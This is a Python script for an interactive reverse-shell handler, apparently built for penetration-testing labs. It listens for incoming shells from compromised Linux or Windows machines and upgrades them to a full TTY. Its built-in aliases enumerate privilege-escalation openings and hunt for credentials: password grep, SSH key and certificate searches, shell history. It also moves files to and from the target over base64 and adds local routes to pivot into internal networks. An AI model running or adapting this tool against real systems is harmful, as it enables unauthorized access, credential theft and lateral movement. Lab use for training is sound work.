#!/usr/bin/env python3
import socket
import threading
import os
import sys
import time
import ipaddress
import subprocess
import re

HOST = "0.0.0.0"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4444

TTY_UPGRADE = "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n"

# ─────────────────────────────────────────────
#  LINUX ALIASES
# ─────────────────────────────────────────────
ALIASES_LINUX = {
    # Privilege escalation
    "privesc":      "sudo -l; id; whoami; uname -a",
    "suid":         "find / -perm -u=s -type f 2>/dev/null",
    "guid":         "find / -perm -g=s -type f 2>/dev/null",
    "world":        "find / -writable -type f 2>/dev/null | grep -v proc",
    "worlddir":     "find / -writable -type d 2>/dev/null | grep -v proc",
    "crons":        "cat /etc/crontab; ls -la /etc/cron*",
    "caps":         "getcap -r / 2>/dev/null",
    # System enum
    "sysinfo":      "uname -a; cat /etc/os-release; hostname; id",
    "users":        "cat /etc/passwd | grep -v nologin | grep -v false",
    "groups":       "cat /etc/group",
    "network":      "ip a 2>/dev/null || ifconfig",
    "procs":        "ps aux",
    "services":     "systemctl list-units --type=service 2>/dev/null",
    # Credential hunting
    "passhunt":     "grep -ri 'password' /home /var/www /opt 2>/dev/null",
    "keyhunt":      "find / -name '*.key' -o -name '*.pem' -o -name 'id_rsa' 2>/dev/null",
    "confhunt":     "find / -name '*.conf' -o -name '*.config' -o -name '*.ini' 2>/dev/null | grep -v proc",
    "history":      "cat ~/.bash_history; cat ~/.zsh_history 2>/dev/null",
    # File system
    "loot":         "ls -la /home; ls -la /root 2>/dev/null; ls -la /var/www 2>/dev/null",
    "proof":        "find / -name 'proof.txt' -o -name 'local.txt' 2>/dev/null",
    "interesting":  "find / -name '*.txt' -o -name '*.bak' -o -name '*.old' 2>/dev/null | grep -v proc",
    # Network
    "arp":          "arp -a; cat /etc/hosts",
    "ports":        "ss -tulpn 2>/dev/null || netstat -tulpn",
    "routes":       "route -n; ip route",
}

# ─────────────────────────────────────────────
#  WINDOWS ALIASES
# ─────────────────────────────────────────────
ALIASES_WINDOWS = {
    # Privilege escalation
    "privesc":      "whoami /all",
    "suid":         "accesschk.exe -uws \"Everyone\" \"C:\\Program Files\" 2>nul",
    "guid":         "accesschk.exe -uws \"Everyone\" \"C:\\Program Files (x86)\" 2>nul",
    "world":        "icacls C:\\* /t /c 2>nul | findstr /i \"(W) Everyone\"",
    "worlddir":     "icacls C:\\* /t /c 2>nul | findstr /i \"(W) Everyone\"",
    "crons":        "schtasks /query /fo LIST /v",
    "caps":         "whoami /priv",
    # System enum
    "sysinfo":      "systeminfo",
    "users":        "net user",
    "groups":       "net localgroup",
    "network":      "ipconfig /all",
    "procs":        "tasklist /v",
    "services":     "sc query type= all state= all",
    # Credential hunting
    "passhunt":     "findstr /si password *.txt *.xml *.ini *.config 2>nul",
    "keyhunt":      "dir /s /b *.key *.pem id_rsa 2>nul",
    "confhunt":     "dir /s /b *.conf *.config *.ini 2>nul",
    "history":      "Get-History | Select-Object CommandLine",
    # File system
    "loot":         "dir C:\\Users & dir C:\\inetpub\\wwwroot 2>nul",
    "proof":        "dir /s /b proof.txt local.txt 2>nul",
    "interesting":  "dir /s /b *.txt *.bak *.old 2>nul",
    # Network
    "arp":          "arp -a & type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "ports":        "netstat -ano",
    "routes":       "route print",
}


def drain_socket(conn, pause_event, wait=2.0, timeout=3.0):
    """
    Pause the receiver thread, wait for remote output, drain the socket buffer.
    Sets pause_event so the receiver thread stops reading, then clears it when done.
    Returns decoded string.
    """
    pause_event.set()        # freeze receiver thread
    time.sleep(wait)         # give remote shell time to respond

    output = b""
    conn.setblocking(False)
    try:
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                output += chunk
            except BlockingIOError:
                time.sleep(0.1)
    finally:
        conn.setblocking(True)
        pause_event.clear()  # resume receiver thread

    return output.decode(errors="ignore")


def detect_os(conn, pause_event):
    """
    Send 'ver' which prints Windows version on Windows and errors on Linux.
    Returns 'windows' or 'linux'.
    """
    print("[*] Detecting remote OS...")
    conn.send(b"ver\n")
    output = drain_socket(conn, pause_event, wait=1.5, timeout=2.0)

    if "Windows" in output or "Microsoft" in output:
        print("[+] Remote OS: Windows")
        return "windows"

    # Confirm Linux with uname
    conn.send(b"uname -s\n")
    output2 = drain_socket(conn, pause_event, wait=1.0, timeout=2.0)
    if any(x in output2 for x in ["Linux", "Darwin", "FreeBSD"]):
        print("[+] Remote OS: Linux/Unix")
    else:
        print("[?] OS unclear — defaulting to Linux")
    return "linux"


# Track routes added this session for cleanup
_added_routes = []


def autoroute(conn, os_type, pause_event, local_iface="tun0"):
    """
    Query remote NICs via the appropriate command for the OS,
    parse the subnets, and add ip routes on the local Kali box.
    """
    global _added_routes

    print(f"[*] Running autoroute on {os_type.upper()} target (local iface: {local_iface})...")

    if os_type == "windows":
        conn.send(b"ipconfig /all\r\n")
    else:
        conn.send(b"ip addr 2>/dev/null || ifconfig 2>/dev/null\n")

    output_str = drain_socket(conn, pause_event, wait=2.0, timeout=3.0)

    if not output_str.strip():
        print("[-] No output received. Run 'network' to confirm the shell is alive.")
        return

    found_networks = set()

    if os_type == "windows":
        # ipconfig /all:
        #   IPv4 Address. . . . . . . . . . . : 10.10.10.5
        #   Subnet Mask . . . . . . . . . . . : 255.255.255.0
        ips   = re.findall(r'IPv4 Address[\s.]+:\s+(\d+\.\d+\.\d+\.\d+)', output_str)
        masks = re.findall(r'Subnet Mask[\s.]+:\s+(\d+\.\d+\.\d+\.\d+)', output_str)
        for ip_str, mask_str in zip(ips, masks):
            try:
                network = ipaddress.ip_interface(f"{ip_str}/{mask_str}").network
                found_networks.add(str(network))
            except ValueError:
                pass
    else:
        # ip addr:  inet 10.10.10.5/24
        for ip_str, prefix in re.findall(r'inet (\d+\.\d+\.\d+\.\d+)/(\d+)', output_str):
            try:
                network = ipaddress.ip_interface(f"{ip_str}/{prefix}").network
                found_networks.add(str(network))
            except ValueError:
                pass
        # ifconfig: inet addr:10.10.10.5  Mask:255.255.255.0
        ips   = re.findall(r'inet addr:(\d+\.\d+\.\d+\.\d+)', output_str)
        masks = re.findall(r'Mask:(\d+\.\d+\.\d+\.\d+)', output_str)
        for ip_str, mask_str in zip(ips, masks):
            try:
                network = ipaddress.ip_interface(f"{ip_str}/{mask_str}").network
                found_networks.add(str(network))
            except ValueError:
                pass

    if not found_networks:
        print("[-] Could not parse any interfaces from remote output.")
        print("[*] Raw output (first 800 chars):")
        print(output_str[:800])
        return

    print(f"[*] Found {len(found_networks)} network(s) on remote host:")
    routes_added = []

    for net_str in sorted(found_networks):
        net = ipaddress.ip_network(net_str)
        if net.is_loopback or net.is_link_local:
            print(f"  [~] Skipping loopback/link-local: {net_str}")
            continue

        print(f"  [>] {net_str}", end=" ... ", flush=True)
        result = subprocess.run(
            ["ip", "route", "add", net_str, "dev", local_iface],
            capture_output=True, text=True
        )
        if result.returncode == 0:
            print("ADDED")
            routes_added.append(net_str)
            _added_routes.append((net_str, local_iface))
        else:
            err = result.stderr.strip()
            print("already exists" if "exists" in err else f"FAILED ({err})")

    print()
    if routes_added:
        print(f"[+] autoroute complete — {len(routes_added)} route(s) added via {local_iface}")
        print("[*] Run 'delroutes' to remove them when done\n")
    else:
        print("[*] No new routes added (all may already exist)\n")


def delroutes():
    """Remove all routes added by autoroute this session."""
    global _added_routes
    if not _added_routes:
        print("[*] No routes to remove (none added this session)")
        return
    print(f"[*] Removing {len(_added_routes)} route(s)...")
    for net_str, iface in _added_routes:
        result = subprocess.run(
            ["ip", "route", "del", net_str, "dev", iface],
            capture_output=True, text=True
        )
        if result.returncode == 0:
            print(f"  [-] Removed: {net_str} via {iface}")
        else:
            print(f"  [!] Could not remove {net_str}: {result.stderr.strip()}")
    _added_routes.clear()
    print("[+] Done\n")


def print_help(os_type="linux"):
    print(f"\n[*] Built in aliases  [mode: {os_type.upper()}]:")
    print("\n  PRIVESC:")
    print("    privesc    — privilege info (sudo -l / whoami /all)")
    print("    suid       — SUID binaries / accesschk writable dirs")
    print("    guid       — GUID binaries / Program Files (x86) perms")
    print("    world      — world writable files")
    print("    worlddir   — world writable directories")
    print("    crons      — cron jobs / scheduled tasks")
    print("    caps       — capabilities / token privileges")
    print("\n  SYSTEM ENUM:")
    print("    sysinfo    — OS and hostname info")
    print("    users      — local users")
    print("    groups     — local groups")
    print("    network    — network interfaces")
    print("    procs      — running processes")
    print("    services   — running services")
    print("\n  CREDENTIAL HUNTING:")
    print("    passhunt   — search for passwords in files")
    print("    keyhunt    — find SSH keys / certs")
    print("    confhunt   — find config files")
    print("    history    — shell command history")
    print("\n  FILE SYSTEM:")
    print("    loot       — check home / web dirs")
    print("    proof      — find proof.txt / local.txt")
    print("    interesting— find txt, bak, old files")
    print("\n  NETWORK:")
    print("    arp        — ARP table and hosts file")
    print("    ports      — listening ports")
    print("    routes     — routing table")
    print("\n  PIVOTING:")
    print("    autoroute [iface] — enumerate remote NICs, add routes on Kali")
    print("                        default iface: tun0")
    print("    delroutes         — remove all routes added this session")
    print("\n  HANDLER:")
    print("    osdetect          — detect remote OS and switch alias mode")
    print("    upload <file>     — upload file to target (/tmp or C:\\Windows\\Temp)")
    print("    download <file>   — download file from target")
    print("    background        — background this session")
    print("    help              — show this menu\n")


def handle_shell(conn, addr):
    print(f"\n[+] Connection from {addr[0]}:{addr[1]}")

    # Default to Linux — run 'osdetect' to switch to Windows mode
    os_type = "linux"
    aliases = ALIASES_LINUX

    print("[*] Defaulting to Linux mode — run 'osdetect' if this is a Windows shell")
    conn.send(TTY_UPGRADE.encode())

    # Event that pauses the receiver while autoroute/osdetect reads the socket
    pause_event = threading.Event()

    def receiver():
        while True:
            # Step aside while autoroute or osdetect is draining the socket
            if pause_event.is_set():
                time.sleep(0.05)
                continue
            try:
                data = conn.recv(4096)
                if not data:
                    break
                print(data.decode(errors="ignore"), end="", flush=True)
            except:
                break

    t = threading.Thread(target=receiver, daemon=True)
    t.start()

    print("[*] Shell ready — type 'help' for built in commands\n")

    while True:
        try:
            cmd = input()

            # ── Help ──────────────────────────────────────────────
            if cmd == "help":
                print_help(os_type)

            # ── OS Detection ──────────────────────────────────────
            elif cmd == "osdetect":
                os_type = detect_os(conn, pause_event)
                aliases = ALIASES_WINDOWS if os_type == "windows" else ALIASES_LINUX
                print(f"[*] Alias mode: {os_type.upper()}\n")

            # ── Upload ────────────────────────────────────────────
            elif cmd.startswith("upload "):
                filename = cmd.split(" ", 1)[1].strip()
                if os.path.exists(filename):
                    with open(filename, "rb") as f:
                        data = f.read()
                    b64 = __import__("base64").b64encode(data).decode()
                    remote_name = os.path.basename(filename)
                    if os_type == "windows":
                        upload_cmd = (
                            f"powershell -c \"[IO.File]::WriteAllBytes("
                            f"'C:\\Windows\\Temp\\{remote_name}',"
                            f"[Convert]::FromBase64String('{b64}'))\"\r\n"
                        )
                        dest = f"C:\\Windows\\Temp\\{remote_name}"
                    else:
                        upload_cmd = f"echo {b64} | base64 -d > /tmp/{remote_name} && chmod +x /tmp/{remote_name}\n"
                        dest = f"/tmp/{remote_name}"
                    conn.send(upload_cmd.encode())
                    print(f"[+] Uploaded {filename} → {dest}")
                else:
                    print(f"[-] File not found: {filename}")

            # ── Download ──────────────────────────────────────────
            elif cmd.startswith("download "):
                filename = cmd.split(" ", 1)[1].strip()
                if os_type == "windows":
                    dl_cmd = f"powershell -c \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{filename}'))\"\r\n"
                else:
                    dl_cmd = f"base64 {filename}\n"
                conn.send(dl_cmd.encode())
                print(f"[*] Copy the base64 output and run locally:")
                print(f"    echo <output> | base64 -d > {os.path.basename(filename)}")

            # ── Background ────────────────────────────────────────
            elif cmd == "background":
                print("[*] Shell backgrounded")
                break

            # ── Autoroute ─────────────────────────────────────────
            elif cmd.startswith("autoroute"):
                parts = cmd.split()
                iface = parts[1] if len(parts) > 1 else "tun0"
                autoroute(conn, os_type, pause_event, local_iface=iface)

            # ── Delete routes ─────────────────────────────────────
            elif cmd == "delroutes":
                delroutes()

            # ── Aliases ───────────────────────────────────────────
            elif cmd in aliases:
                print(f"[*] Running: {aliases[cmd]}")
                eol = "\r\n" if os_type == "windows" else "\n"
                conn.send((aliases[cmd] + eol).encode())

            # ── Regular command ───────────────────────────────────
            else:
                eol = "\r\n" if os_type == "windows" else "\n"
                conn.send((cmd + eol).encode())

        except KeyboardInterrupt:
            print("\n[*] Backgrounding shell")
            break
        except Exception as e:
            print(f"[-] Error: {e}")
            break


BANNER = "\033[1;32m\n         ══════════════════════════════════════════════════════\n\033[1;37m              H A N D L E R   //   S H E L L   C A T C H E R\n\033[1;32m         ══════════════════════════════════════════════════════\n\033[0;33m\n            \"The Only Way Out Is Through\"\n\033[0m"

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    print(BANNER)
    print(f"\033[1;32m[*]\033[0m Listening on {HOST}:{PORT}")
    print(f"\033[1;32m[*]\033[0m Type 'help' once connected for built in commands\n")

    while True:
        try:
            conn, addr = server.accept()
            thread = threading.Thread(
                target=handle_shell,
                args=(conn, addr),
                daemon=True
            )
            thread.start()
        except KeyboardInterrupt:
            print("\n[*] Shutting down")
            break

if __name__ == "__main__":
    main()
